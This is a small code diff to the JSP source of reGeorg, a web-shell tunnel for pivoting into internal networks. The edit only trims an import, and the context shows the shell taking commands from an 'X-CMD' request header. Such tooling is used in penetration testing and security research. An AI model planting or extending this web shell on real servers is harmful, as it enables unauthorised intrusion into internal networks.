@@ -24,7 +24,7 @@ to exist within your internal network.
 For more information, see:
 https://github.com/sensepost/reGeorg
 
-*/%><%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket, java.net.InetAddress" trimDirectiveWhitespaces="true"%><%
+*/%><%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.io.IOException, java.net.UnknownHostException, java.net.Socket, java.net.InetAddress" trimDirectiveWhitespaces="true"%><%
     String cmd = request.getHeader("X-CMD");
     if (cmd != null) {
         response.setHeader("X-STATUS", "OK");
